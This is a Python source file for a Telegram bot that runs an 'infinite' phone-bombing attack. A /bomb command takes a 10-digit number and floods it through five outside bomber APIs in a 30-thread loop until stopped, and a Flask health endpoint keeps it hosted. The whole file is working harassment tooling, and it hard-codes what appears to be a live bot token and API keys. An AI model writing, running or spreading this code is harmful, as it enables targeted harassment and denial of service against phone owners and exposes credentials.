import os
import time
import requests
import threading
from flask import Flask
import telebot
from concurrent.futures import ThreadPoolExecutor, as_completed

# ====== CONFIGURATION ======
BOT_TOKEN = "8975125640:AAFOMQlW5WFzVsh7GZNFps-IhcUd_kMxD4A"
BOT_USERNAME = "ecbomberbot"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ====== 5 APIS LOADED ======
FIVE_APIS = [
    {
        "name": "Part1_Bomber",
        "url": "https://bomber-part-1.onrender.com/bomb",
        "params": {"phone": "{num}", "key": "admin123", "cycles": "3"}
    },
    {
        "name": "Part2_Bomber",
        "url": "https://brutal-bomber-part-2.onrender.com/bomb",
        "params": {"phone": "{num}", "key": "admin123", "cycles": "3"}
    },
    {
        "name": "Ultra_Bomber",
        "url": "https://ultra-brutal-bomber.onrender.com/bomb",
        "params": {"phone": "{num}", "key": "admin123", "cycles": "3"}
    },
    {
        "name": "Bomber_Pro",
        "url": "https://bomber-pro.onrender.com/bomb",
        "params": {"phone": "{num}", "key": "shuvo", "cycles": "5"}
    },
    {
        "name": "Bomber_APIs_9ekv",
        "url": "https://bomber-apis-9ekv.onrender.com/bom",
        "params": {"key": "felix", "num": "{num}"}
    }
]

# ====== INFINITE BOMBER ENGINE ======
class InfiniteBomber:
    def __init__(self, phone, threads=30, delay=0.01):
        self.phone = phone
        self.threads = threads
        self.delay = delay
        self.running = True
        self.success = 0
        self.failed = 0
        self.start_time = time.time()
        self.session = requests.Session()
    
    def _send(self, api):
        if not self.running:
            return False
        time.sleep(self.delay)
        try:
            params = api["params"].copy()
            for k, v in params.items():
                if isinstance(v, str) and "{num}" in v:
                    params[k] = v.replace("{num}", self.phone)
            resp = self.session.get(api["url"], params=params, timeout=5)
            if resp.status_code in [200, 201, 202, 204]:
                return True
            return False
        except:
            return False
    
    def start(self):
        self.running = True
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            while self.running:
                futures = [ex.submit(self._send, api) for api in FIVE_APIS * 2]
                for f in as_completed(futures):
                    if not self.running:
                        break
                    if f.result():
                        self.success += 1
                    else:
                        self.failed += 1
    
    def stop(self):
        self.running = False

active_bombers = {}

# ====== TELEGRAM COMMAND HANDLERS ======

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    msg = (
        f"🔥 **Welcome to @{BOT_USERNAME}** 🔥\n\n"
        "**Available Commands:**\n"
        "▶ `/bomb <10-digit-number>` - Start infinite bombing\n"
        "⏹ `/stop <10-digit-number>` - Stop bombing\n"
        "📊 `/status` - Check active attacks"
    )
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.message_handler(commands=['bomb'])
def start_bombing(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ **Usage:** `/bomb 9876543210`", parse_mode="Markdown")
        return
    
    phone = args[1].strip()
    if not phone.isdigit() or len(phone) != 10:
        bot.reply_to(message, "❌ **Error:** Please enter a valid 10-digit mobile number.")
        return

    if phone in active_bombers:
        bot.reply_to(message, f"⚠️ Attack is already running on **{phone}**.", parse_mode="Markdown")
        return

    bomber = InfiniteBomber(phone)
    active_bombers[phone] = bomber

    def run_thread():
        bomber.start()

    threading.Thread(target=run_thread, daemon=True).start()
    
    bot.reply_to(
        message, 
        f"🚀 **Attack Started Successfully!**\n\n"
        f"📱 **Target:** `{phone}`\n"
        f"⚡ **APIs Loaded:** `{len(FIVE_APIS)}`\n"
        f"🔄 **Mode:** Infinite Loop\n\n"
        f"To stop: `/stop {phone}`",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['stop'])
def stop_bombing(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ **Usage:** `/stop 9876543210`", parse_mode="Markdown")
        return
    
    phone = args[1].strip()
    if phone in active_bombers:
        active_bombers[phone].stop()
        del active_bombers[phone]
        bot.reply_to(message, f"🛑 **Attack stopped on `{phone}`**", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"❌ No active attack found for `{phone}`.", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def check_status(message):
    if not active_bombers:
        bot.reply_to(message, "ℹ️ No attacks currently running.")
        return
    
    text = "🔥 **Active Attacks:**\n\n"
    for num in active_bombers:
        text += f"• `{num}`\n"
    bot.reply_to(message, text, parse_mode="Markdown")

# ====== WEB SERVER & RENDER HEALTH CHECK ======

@app.route('/')
@app.route('/health')
def health():
    return "Bot is alive and running!", 200

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

# ====== MAIN ENTRY POINT ======
if __name__ == "__main__":
    # Start Flask Web Server for Render
    threading.Thread(target=run_flask, daemon=True).start()
    
    # Start Telegram Bot Polling
    print("🤖 Bot Started...")
    bot.infinity_polling()

